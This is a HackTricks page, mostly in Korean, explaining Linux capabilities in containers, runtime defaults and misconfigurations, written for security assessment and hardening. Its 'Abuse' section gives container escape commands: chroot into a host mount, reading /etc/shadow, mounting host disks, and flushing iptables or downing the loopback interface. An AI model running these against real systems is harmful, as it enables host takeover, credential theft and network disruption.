# 컨테이너의 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux capabilities는 컨테이너 보안에서 가장 중요한 요소 중 하나입니다. 그 이유는 미묘하지만 근본적인 질문에 답하기 때문입니다: **컨테이너 내부에서 "root"는 실제로 무엇을 의미하는가?** 일반적인 Linux 시스템에서 UID 0은 역사적으로 매우 광범위한 권한 집합을 의미했습니다. 현대 커널에서는 그 권한이 capabilities라고 불리는 더 작은 단위들로 분해되어 있습니다. 관련된 capabilities가 제거되면 프로세스는 root로 실행되더라도 많은 강력한 작업을 수행하지 못할 수 있습니다.

컨테이너는 이 구분에 크게 의존합니다. 많은 워크로드가 호환성이나 단순성 때문에 컨테이너 내부에서 여전히 UID 0으로 실행됩니다. capability를 제거하지 않으면 이는 매우 위험합니다. capability를 제거하면 컨테이너화된 root 프로세스는 여전히 많은 일반적인 컨테이너 내부 작업을 수행할 수 있지만 더 민감한 커널 작업은 거부됩니다. 그래서 `uid=0(root)`이라고 표시된 컨테이너 셸이 자동으로 "host root" 또는 "광범위한 커널 권한"을 의미하지는 않습니다. capability 집합이 그 root 정체성이 실제로 얼마나 가치가 있는지를 결정합니다.

전체 Linux capability 참조와 많은 남용 예시는 다음을 참조하세요:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 작동

Capabilities는 permitted, effective, inheritable, ambient, 그리고 bounding sets를 포함한 여러 집합으로 추적됩니다. 많은 컨테이너 평가에서 각 집합의 정확한 커널 의미론은 최종적인 실용적 질문보다 즉각적으로 중요하지 않을 수 있습니다: **이 프로세스가 지금 당장 성공적으로 수행할 수 있는 권한 있는 작업은 무엇이고, 앞으로 얻을 수 있는 권한 이득은 무엇인가?**

이것이 중요한 이유는 많은 탈출 기술들이 사실 컨테이너 문제로 위장한 capability 문제이기 때문입니다. `CAP_SYS_ADMIN`을 가진 워크로드는 일반적인 컨테이너 root 프로세스가 건드리면 안 되는 방대한 커널 기능에 접근할 수 있습니다. `CAP_NET_ADMIN`을 가진 워크로드는 호스트 네트워크 네임스페이스를 공유할 경우 훨씬 더 위험해집니다. `CAP_SYS_PTRACE`를 가진 워크로드는 호스트 PID 공유를 통해 호스트 프로세스를 볼 수 있다면 훨씬 흥미로워집니다. Docker나 Podman에서는 이것이 `--pid=host`로 보일 수 있고, Kubernetes에서는 보통 `hostPID: true`로 나타납니다.

다시 말해, capability 집합은 단독으로 평가될 수 없습니다. 네임스페이스, seccomp, 그리고 MAC policy와 함께 읽어야 합니다.

## 실습

컨테이너 내부에서 capabilities를 직접 확인하는 매우 직접적인 방법은:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
더 제한적인 컨테이너를 모든 capabilities가 추가된 컨테이너와 비교할 수도 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
좁은 추가의 효과를 확인하려면, 모든 것을 제거하고 하나의 capability만 다시 추가해 보세요:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
이러한 작은 실험들은 런타임이 단순히 "privileged"라는 불리언을 토글하는 것이 아님을 보여준다. 런타임은 프로세스가 이용할 수 있는 실제 권한 표면을 형성한다.

## High-Risk Capabilities

대상에 따라 여러 capabilities가 중요할 수 있지만, 컨테이너 이스케이프 분석에서 반복해서 관련되는 몇 가지가 있다.

**`CAP_SYS_ADMIN`**은 수비자가 가장 의심해야 할 권한이다. 흔히 "the new root"라고 불리는데, 마운트 관련 작업, 네임스페이스에 민감한 동작, 그리고 컨테이너에 캐주얼하게 노출되어서는 안 되는 많은 커널 경로를 열어주기 때문이다. 컨테이너에 `CAP_SYS_ADMIN`, 약한 seccomp, 강한 MAC 제약이 없으면 많은 고전적 탈출 경로가 훨씬 현실화된다.

**`CAP_SYS_PTRACE`**는 프로세스 가시성이 존재할 때 중요하다. 특히 PID namespace를 호스트나 흥미로운 인접 워크로드와 공유하는 경우에 그렇다. 가시성을 조작으로 전환할 수 있다.

**`CAP_NET_ADMIN`** 및 **`CAP_NET_RAW`**는 네트워크 중심 환경에서 중요하다. 격리된 브리지 네트워크에서도 이미 위험할 수 있고, 호스트 네트워크 네임스페이스를 공유하는 경우에는 훨씬 더 위험해지는데, 워크로드가 호스트 네트워킹을 재구성하거나 sniff, spoof, 또는 로컬 트래픽 흐름을 방해할 수 있기 때문이다.

**`CAP_SYS_MODULE`**은 일반적으로 rootful 환경에서 치명적이다. 커널 모듈 로딩은 사실상 호스트 커널 제어이기 때문이다. 일반 목적의 컨테이너 워크로드에선 거의 절대 나타나서는 안 된다.

## Runtime Usage

Docker, Podman, containerd 기반 스택, CRI-O는 모두 capability 제어를 사용하지만 기본값과 관리 인터페이스는 다르다. Docker는 `--cap-drop` 및 `--cap-add` 같은 플래그로 이를 매우 직접적으로 노출한다. Podman도 유사한 제어를 제공하며 추가적인 안전 계층으로서 rootless 실행의 이점을 자주 누린다. Kubernetes는 Pod 또는 컨테이너의 `securityContext`를 통해 capability 추가 및 제거를 노출한다. LXC/Incus와 같은 시스템 컨테이너 환경도 capability 제어에 의존하지만, 그러한 시스템들의 더 광범위한 호스트 통합 때문에 운영자가 앱 컨테이너 환경보다 기본값을 더 공격적으로 완화하는 유혹을 받는 경우가 많다.

모든 경우에 동일한 원칙이 적용된다: 기술적으로 부여 가능한 capability가 반드시 부여되어야 하는 것은 아니다. 많은 실제 사고는 운영자가 더 엄격한 구성에서 워크로드가 실패하자 빠른 해결책으로 capability를 추가하면서 시작된다.

## Misconfigurations

가장 명백한 실수는 Docker/Podman 스타일 CLI에서의 **`--cap-add=ALL`**이지만, 그것만이 전부는 아니다. 실제로 더 흔한 문제는 하나 또는 두 개의 매우 강력한 capability, 특히 `CAP_SYS_ADMIN`을 "애플리케이션이 동작하게 하기 위해" 부여하면서 네임스페이스, seccomp, 마운트 영향은 이해하지 못하는 경우다. 또 다른 흔한 실패 모드는 추가 capability를 호스트 네임스페이스 공유와 결합하는 것이다. Docker나 Podman에서는 이것이 `--pid=host`, `--network=host`, 또는 `--userns=host`로 나타날 수 있고; Kubernetes에서는 동등한 노출이 보통 `hostPID: true` 또는 `hostNetwork: true` 같은 워크로드 설정을 통해 나타난다. 이러한 조합 각각은 해당 capability가 실제로 무엇에 영향을 미칠 수 있는지를 바꾼다.

워크로드가 완전히 `--privileged`가 아니므로 의미 있게 제약되어 있다고 생각하는 관리자도 흔히 볼 수 있다. 때로는 그 말이 맞을 때도 있지만, 때로는 실질적인 태세가 이미 privileged에 충분히 가까워져 그 구분이 운영적으로 더 이상 중요하지 않을 수 있다.

## Abuse

첫 번째 실질적 단계는 유효한(효과적인) capability 집합을 열거하고, 탈출 또는 호스트 정보 접근에 영향을 줄 수 있는 capability별 동작을 즉시 테스트하는 것이다:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
만약 `CAP_SYS_ADMIN`이 존재하면, 먼저 mount-based abuse와 host filesystem access를 테스트하세요. 이는 가장 흔한 breakout enablers 중 하나입니다:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
만약 `CAP_SYS_PTRACE`가 있고 container가 흥미로운 프로세스를 볼 수 있다면, 이 capability를 프로세스 검사로 전환할 수 있는지 확인하세요:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
만약 `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`가 존재하면, 워크로드가 보이는 네트워크 스택을 조작할 수 있는지 또는 적어도 유용한 네트워크 정보를 수집할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
When a capability test succeeds, combine it with the namespace situation. A capability that looks merely risky in an isolated namespace can become an escape or host-recon primitive immediately when the container also shares host PID, host network, or host mounts.

### 전체 예시: `CAP_SYS_ADMIN` + Host Mount = Host Escape

컨테이너가 `CAP_SYS_ADMIN` 권한을 가지고 있고 `/host` 같은 호스트 파일시스템의 쓰기 가능한 bind mount가 있을 경우, escape 경로는 종종 다음과 같이 단순하다:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
만약 `chroot`가 성공하면, 명령은 이제 호스트 루트 파일시스템 컨텍스트에서 실행됩니다:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot`를 사용할 수 없는 경우, 마운트된 트리를 통해 해당 binary를 호출하면 동일한 결과를 얻을 수 있습니다:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 전체 예제: `CAP_SYS_ADMIN` + 디바이스 접근

호스트의 블록 디바이스가 노출되면, `CAP_SYS_ADMIN`은 이를 직접 호스트 파일 시스템 접근으로 바꿀 수 있다:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 전체 예시: `CAP_NET_ADMIN` + Host Networking

이 조합은 항상 host root를 직접적으로 확보해주지는 않지만, host network stack을 완전히 재구성할 수 있습니다:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
이는 denial of service, traffic interception, 또는 이전에 필터링되었던 서비스에 대한 접근을 가능하게 할 수 있습니다.

## Checks

capability checks의 목적은 단순히 raw values를 덤프하는 것이 아니라, 프로세스가 현재의 namespace 및 mount 상황을 위험하게 만들 수 있을 만큼 충분한 privilege를 가지고 있는지를 이해하는 것입니다.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
What is interesting here:

- `capsh --print`은 `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, 또는 `cap_sys_module` 같은 고위험 capabilities를 확인하는 가장 쉬운 방법입니다.
- `CapEff` 라인은 `/proc/self/status`에서 현재 실제로 유효한 것이 무엇인지 알려주며, 다른 세트에만 있을 수 있는 것이 무엇인지는 알려주지 않습니다.
- 컨테이너가 호스트 PID, network, 또는 user namespaces를 공유하거나 호스트 마운트가 쓰기 가능할 경우, capability dump의 중요성은 훨씬 커집니다.

원시 capability 정보를 수집한 후, 다음 단계는 해석입니다. 프로세스가 root인지, user namespaces가 활성화되어 있는지, host namespaces가 공유되는지, seccomp가 적용 중인지, AppArmor 또는 SELinux가 여전히 프로세스를 제한하는지를 확인하세요. capability 집합 자체는 이야기의 일부에 불과하지만, 동일한 초기 상태에서 한 컨테이너 탈출은 성공하고 다른 하나는 실패하는 이유를 설명하는 경우가 많습니다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 축소된 capability 집합 | Docker는 기본 허용 목록을 유지하고 나머지 capability를 제거합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 기본적으로 축소된 capability 집합 | Podman 컨테이너는 기본적으로 비특권이며 축소된 capability 모델을 사용합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 변경되지 않으면 런타임 기본값을 상속 | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 보통 런타임 기본값 | 유효한 집합은 런타임과 Pod 스펙에 따라 달라집니다 | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

For Kubernetes, the important point is that the API does not define one universal default capability set. If the Pod does not add or drop capabilities, the workload inherits the runtime default for that node.
{{#include ../../../../banners/hacktricks-training.md}}
